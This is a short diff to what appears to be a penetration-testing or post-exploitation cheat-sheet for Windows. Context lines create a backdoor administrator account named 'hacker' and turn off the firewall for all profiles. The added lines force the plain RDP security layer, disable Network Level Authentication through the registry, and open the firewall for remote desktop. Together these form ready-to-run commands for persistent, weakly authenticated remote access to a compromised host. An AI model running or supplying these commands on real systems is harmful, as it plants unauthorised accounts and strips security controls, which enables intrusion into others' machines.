@@ -8,7 +8,16 @@ OR
 C:\>net user hacker Password123! /add
 net localgroup administrators hacker /add
 
+# Force RDP Security Layer (0 = RDP, 1 = SSL/TLS, 2 = Auto)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
 
+# Disable NLA
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+# Allow RDP through Firewall
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+----------------------------------------------------------------------------
 
 netsh advfirewall set allprofiles state off
 
